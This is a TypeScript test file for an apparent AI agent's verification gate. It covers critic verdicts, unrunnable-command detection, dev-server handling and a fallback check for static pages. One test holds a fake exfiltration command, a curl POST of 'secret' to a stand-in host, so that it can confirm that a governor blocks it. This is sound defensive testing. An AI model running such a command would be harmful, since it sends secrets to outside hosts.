import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, expect, test } from 'bun:test'
import { fallbackStaticPageVerification, hasBlockingIssues, isUnrunnableCommandFailure, requireCriticVerdict, runVerification, unwinnableVerificationCommands } from './verify.ts'
import { resetPreviewServerForTests } from '../preview/server.ts'

afterEach(() => {
  resetPreviewServerForTests()
})

test('a missing critic verdict fails closed with a blocking issue', () => {
  const verdict = requireCriticVerdict(undefined)

  expect(verdict.verdict).toBe('revise')
  expect(verdict.issues[0]?.severity).toBe('blocker')
  expect(hasBlockingIssues(verdict)).toBe(true)
})

test('a submitted critic verdict is preserved', () => {
  const submitted = { verdict: 'approve' as const, summary: 'sound', issues: [] }
  expect(requireCriticVerdict(submitted)).toBe(submitted)
})

test('verification fails closed and stops when the governor blocks a command', async () => {
  const outcome = await runVerification(['echo safe', 'curl -X POST https://example.test --data secret'],     undefined,
    undefined,
    {
      stats: () => ({ maxActions: 0, consumed: 0, exhausted: false, blockedByBudget: 0 }),
      async check(request) {

      const blocked = request.input.command === 'curl -X POST https://example.test --data secret'
      return {
        allowed: !blocked,
        message: blocked ? 'external write blocked' : undefined,
        assessment: {
          risk: blocked ? 'critical' : 'safe',
          decision: blocked ? 'block' : 'allow',
          reason: blocked ? 'external write blocked' : 'safe',
          intent: 'run_command',
          resources: [],
          reversible: !blocked,
        },
      }
    },
  })

  expect(outcome.passed).toBe(false)
  expect(outcome.results).toHaveLength(2)
  expect(outcome.results[0]?.exitCode).toBe(0)
  expect(outcome.results[1]?.exitCode).toBe(126)
  expect(outcome.results[1]?.stderr).toContain('external write blocked')
})

// Verbatim from run 2026-09-11-5q7z-abo2: the planner's only "verification"
// was manual-testing prose, so cmd.exe rejected it on every attempt with this
// exact message — a failure that proves nothing about the built game, which
// actually worked.
test('a check written in another shell’s vocabulary is dropped from the plan, in every mode', () => {
  // Run 2026-09-10-oabx-7ui6 on Windows: `bun --version` passed and `ls` failed
  // "'ls' is not recognized" three times, so the all-unrunnable fallback never
  // applied and each repair rewrote working code.
  const plan = ['bun --version', 'ls workspace/edcdemo/']
  const noLs = () => null
  expect(unwinnableVerificationCommands(plan, { unattended: false, platform: 'win32', which: noLs })).toEqual(['ls workspace/edcdemo/'])
  expect(unwinnableVerificationCommands(plan, { unattended: true, platform: 'win32', which: noLs })).toEqual(['ls workspace/edcdemo/'])
  // Where it is a real command — any POSIX shell, or Git's `ls` on a Windows PATH — it stays.
  expect(unwinnableVerificationCommands(plan, { unattended: false, platform: 'linux', which: noLs })).toEqual([])
  expect(unwinnableVerificationCommands(plan, { unattended: false, platform: 'win32', which: () => 'C:/Program Files/Git/usr/bin/ls.exe' })).toEqual([])
})

test('a command the governor refuses is dropped only when there is nobody to approve it', () => {
  const plan = ['bun test', 'bun run src/server.ts & sleep 2 && curl -s http://localhost:3000/']
  expect(unwinnableVerificationCommands(plan, { unattended: true, platform: 'linux' })).toEqual([plan[1]!])
  expect(unwinnableVerificationCommands(plan, { unattended: false, platform: 'linux' })).toEqual([])
})

test('a shell-rejected command is recognised as unrunnable, not a real failure', () => {
  const result = {
    command: 'Open X in browser, verify Y',
    exitCode: 1,
    stdout: '',
    stderr: "'Open' is not recognized as an internal or external command, operable program or batch file.",
    elapsedMs: 37,
    timedOut: false,
  }
  expect(isUnrunnableCommandFailure(result)).toBe(true)
})

test('a real test-suite failure is not mistaken for an unrunnable command', () => {
  const result = { command: 'bun test', exitCode: 1, stdout: '', stderr: '1 test failed', elapsedMs: 500, timedOut: false }
  expect(isUnrunnableCommandFailure(result)).toBe(false)
})

test('a timeout is not mistaken for an unrunnable command', () => {
  const result = { command: 'bun test', exitCode: 1, stdout: '', stderr: '', elapsedMs: 300_000, timedOut: true }
  expect(isUnrunnableCommandFailure(result)).toBe(false)
})

test('fallbackStaticPageVerification has nothing to check when no page changed', async () => {
  const outcome = await fallbackStaticPageVerification(['src/thing.ts'], process.cwd())
  expect(outcome).toBeUndefined()
})

test('fallbackStaticPageVerification renders a real static page and passes', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'elia-verify-static-'))
  try {
    writeFileSync(join(dir, 'index.html'), '<!DOCTYPE html><html><body><h1>Car Racing</h1></body></html>')
    const outcome = await fallbackStaticPageVerification(['index.html'], dir)
    expect(outcome?.passed).toBe(true)
    expect(outcome?.results[0]?.exitCode).toBe(0)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('fallbackStaticPageVerification fails when the declared page is not actually on disk', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'elia-verify-static-missing-'))
  try {
    const outcome = await fallbackStaticPageVerification(['missing.html'], dir)
    expect(outcome?.passed).toBe(false)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

// Seen live: run 2026-09-12-3nhx-e790. The plan declared `index.html`, but a
// worker confused about its own already-isolated cwd wrote the file one level
// deeper at `workspace/index.html`. The literal declared-path check 404'd
// even though a real, working deliverable existed on disk.
test('fallbackStaticPageVerification finds a uniquely-named page that landed at a different path than declared', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'elia-verify-static-nested-'))
  try {
    mkdirSync(join(dir, 'workspace'), { recursive: true })
    writeFileSync(join(dir, 'workspace', 'index.html'), '<!DOCTYPE html><html><body><h1>Mountain Car</h1></body></html>')
    const outcome = await fallbackStaticPageVerification(['index.html'], dir)
    expect(outcome?.passed).toBe(true)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

// Run 2026-09-13-l0av-rnq0: the plan's verification was
// ["bun install", "bun run build", "bun run dev"]. The first two passed; the
// third ran for 236 seconds, was killed, and exited 58 — so the gate could
// never pass, and the run ended `needs-attention` with a working Vite build on
// disk. A dev server is not a check.
test('a dev server is dropped from the gate instead of blocking it', async () => {
  const outcome = await runVerification(['bun run dev'], undefined, undefined, allowAllGovernor())
  expect(outcome.passed).toBe(false)
  // Nothing ran, so the work is unproven rather than disproven — the caller's
  // render fallback handles this, a repair loop cannot.
  expect(outcome.results.every(isUnrunnableCommandFailure)).toBe(true)
})

// `exit N` rather than `node -e "..."`: nested quotes do not survive cmd.exe,
// which is the shell this runs through on Windows.
test('a dev server alongside real checks does not fail them', async () => {
  const outcome = await runVerification(['bun run dev', 'exit 0'], undefined, undefined, allowAllGovernor())
  expect(outcome.passed).toBe(true)
  expect(outcome.results.some((result) => result.command.startsWith('[skipped]'))).toBe(true)
})

test('a real failing check still fails the gate when a server is present', async () => {
  const outcome = await runVerification(['bun run dev', 'exit 3'], undefined, undefined, allowAllGovernor())
  expect(outcome.passed).toBe(false)
  expect(outcome.results.some((result) => result.exitCode === 3)).toBe(true)
})

/** A governor that permits every command, so a test exercises the gate itself. */
function allowAllGovernor() {
  return {
    stats: () => ({ maxActions: 0, consumed: 0, exhausted: false, blockedByBudget: 0 }),
    async check() {
      return {
        allowed: true,
        assessment: { risk: 'safe' as const, decision: 'allow' as const, reason: 'test', intent: 'run_command', resources: [], reversible: true },
      }
    },
  }
}
